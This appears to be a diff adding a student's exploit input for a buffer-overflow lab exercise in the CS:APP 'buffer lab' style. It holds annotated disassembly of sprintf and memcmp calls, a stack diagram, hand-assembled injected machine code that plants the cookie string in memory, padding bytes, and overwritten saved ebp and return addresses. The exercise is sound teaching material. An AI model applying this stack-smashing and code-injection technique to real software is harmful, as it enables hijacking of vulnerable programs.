@@ -1,0 +1,87 @@
+/*
+uid = 9660527;
+cookie = 0x61f14dbf;
+*/
+
+/*    eval2equal
+
+      lea    -0x47(%ebp),%eax    //eax = ebp-0x47
+      add    %edx,%eax          //eax = eax + edx(random)        
+      mov    %eax,-0xc(%ebp)   //m(ebp-0xc) = eax              
+      sub    $0x4,%esp        //    
+      pushl  0xc(%ebp)       // ...  
+      push   $0x804b0e3     //*format:  "%.8X"     
+      pushl  -0xc(%ebp)    //*str
+      call   0x8049200 <sprintf@plt>
+      
+      int sprintf(char *str, const char *format, ...);
+0x804b0e3:  "%.8X"
+
+eval2equal_stack
+        +-------+
+        | cookie|
+        |  str  |
+        |  eip  |
+  ebp-> |  ebp  |
+        |       |
+        |       |
+        | str1  |
+        |       |
+        +-------+
+      *str1 = *cookie
+0x61f14dbaf <cookie>: 0x36    0x31    0x46    0x31    0x34     0x44    0x42    0x46   0x00
+*/
+
+/*
+       push   $0x9               //  n 
+       pushl  -0xc(%ebp)        //  s2=str1
+       pushl  0x8(%ebp)        //  s1=str
+       call   0x80490b0 <memcmp@plt>
+       add    $0x10,%esp          
+       test   %eax,%eax        
+       sete   %al             // al = ZF,need to make al = 1
+
+int memcmp(const void *s1, const void *s2, size_t n);
+s1 == s2 , return 0;
+
+*/
+
+55                   	/* push   %ebp */
+89 e5                	/* mov    %esp,%ebp */
+/* b8 bf 4d f1 61       	/* mov    $0x61f14dbf,%eax */ /* need to delete */ */
+bb fe 36 68 55       	/* mov    $0x55683730,%ebx */ /* 0x556836d9+0x25 */ 
+89 5d 0c             	/* mov    %ebx,0xc(%ebp) */
+b9 36 31 46 31       	/* mov    $0x31463136,%ecx */
+89 0b                	/* mov    %ecx,(%ebx) */
+b9 34 44 42 46       	/* mov    $0x46424434,%ecx */
+89 4b 04             	/* mov    %ecx,0x4(%ebx) */
+c6 43 08 00          	/* movb   $0x0,0x8(%ebx) */
+c9                   	/* leave   */
+c3                   	/* ret     */
+
+
+/* 36 31 46 31 34 44 42 46 00 4a /* cookie's string value */ */
+41 42 43 44 45 46 47 48 49 4a
+41 42 43 44 45 46 47 48 49 4a
+41 42 43 44 45 46 47 48 49 4a
+41 42 43 44 45 46 47 48 49 4a
+41 42 43 44 45 46 47 48 49 4a
+41 42 43 44 45 46 47 48 49 4a
+41 42 43 44 45 46 47 48 49 4a
+41
+  
+
+/*
+end of buffer
+*/
+
+60 37 68 55 /* caller's saved ebp */
+d9 36 68 55 /* attack_address,saved eip:84 95 04 08 */
+14 95 04 08 /* rumble's eip */
+84 95 04 08 /* caller's eip */
+
+
+
+
+
+
